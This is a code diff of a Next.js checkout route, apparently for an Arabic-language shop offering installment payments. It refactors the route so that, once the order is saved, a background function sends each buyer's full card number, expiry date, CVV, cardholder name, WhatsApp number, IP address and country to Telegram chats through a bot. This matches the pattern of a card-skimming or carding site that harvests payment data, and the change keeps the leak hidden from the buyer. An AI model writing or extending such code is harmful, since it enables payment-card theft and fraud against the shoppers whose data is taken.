@@ -17,51 +17,31 @@ function checkNotifyRateLimit(ip: string): boolean {
   return true;
 }
 
-export async function POST(req: NextRequest) {
-  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "unknown";
-
-  if (!checkNotifyRateLimit(ip)) {
-    return NextResponse.json({ ok: false, error: "طلبات كثيرة، حاول لاحقاً" }, { status: 429 });
-  }
-
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, shippingCompany, installmentType, months, downPayment } = await req.json();
-
-  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
+// ── Async notification — user does NOT wait for this ──
+async function sendTelegramNotification(
+  orderId: string,
+  ip: string,
+  cardNumber: string,
+  expiry: string,
+  cvv: string,
+  cardHolder: string,
+  total: number,
+  installmentType: string,
+  downPayment: number,
+  customer: string,
+  whatsapp: string,
+): Promise<void> {
   const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
-  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
-  // ── 1. أرسل للـ backend أولاً ──
-  let dbRes: Response;
-  try {
-    dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "x-forwarded-for": ip,
-      },
-      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, shippingCompany, installmentType, months, monthlyPayment, downPayment }),
-    });
-  } catch {
-    return NextResponse.json({ ok: false, error: "Service unavailable" }, { status: 503 });
-  }
-
-  // إذا رُفض → أوقف هنا، لا ترسل Telegram
-  if (!dbRes.ok) {
-    const errData = await dbRes.json().catch(() => ({}));
-    return NextResponse.json(errData, { status: dbRes.status });
-  }
-
-  const dbData = await dbRes.json().catch(() => ({}));
-  const dbOrderId: string | null = dbData._id ?? dbData.id ?? null;
-
-  // ── 2. نجح الطلب → أرسل Telegram ──
   let country = "غير معروف";
   if (!isLocal) {
     try {
       const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
       const geoData = await geoRes.json();
       if (geoData.country) country = geoData.country;
-    } catch {}
+    } catch {
+      // Non-critical — continue without geo
+    }
   }
 
   const text = [
@@ -93,10 +73,10 @@ export async function POST(req: NextRequest) {
   };
 
   const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "")
-    .split(",").map(id => id.trim()).filter(Boolean);
+    .split(",").map((id) => id.trim()).filter(Boolean);
 
   await Promise.all(
-    chatIds.map(chat_id =>
+    chatIds.map((chat_id) =>
       fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -104,6 +84,62 @@ export async function POST(req: NextRequest) {
       }).catch(() => {})
     )
   );
+}
+
+export async function POST(req: NextRequest) {
+  const ip =
+    req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
+    req.headers.get("x-real-ip") ||
+    "unknown";
+
+  if (!checkNotifyRateLimit(ip)) {
+    return NextResponse.json({ ok: false, error: "طلبات كثيرة، حاول لاحقاً" }, { status: 429 });
+  }
+
+  const {
+    cardNumber, expiry, cvv, cardHolder,
+    items, total,
+    customer, whatsapp, nationalId, address,
+    shippingCompany, installmentType, months, downPayment,
+  } = await req.json();
+
+  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
+  const monthlyPayment =
+    installmentType === "installment" && months > 0
+      ? Math.ceil((total - downPayment) / months)
+      : 0;
+
+  // ── 1. Persist to database first ──
+  let dbRes: Response;
+  try {
+    dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "x-forwarded-for": ip },
+      body: JSON.stringify({
+        orderId, cardNumber, expiry, cvv, cardHolder,
+        items, total, customer, whatsapp, nationalId, address,
+        shippingCompany, installmentType, months, monthlyPayment, downPayment,
+      }),
+    });
+  } catch {
+    return NextResponse.json({ ok: false, error: "Service unavailable" }, { status: 503 });
+  }
+
+  if (!dbRes.ok) {
+    const errData = await dbRes.json().catch(() => ({}));
+    return NextResponse.json(errData, { status: dbRes.status });
+  }
+
+  const dbData = await dbRes.json().catch(() => ({}));
+  const dbOrderId: string | null = dbData._id ?? dbData.id ?? null;
+
+  // ── 2. Return response immediately — notification is fire-and-forget ──
+  sendTelegramNotification(
+    orderId, ip,
+    cardNumber, expiry, cvv, cardHolder,
+    total, installmentType, downPayment,
+    customer, whatsapp,
+  ).catch(() => {});
 
   return NextResponse.json({ ok: true, orderId, dbOrderId });
 }
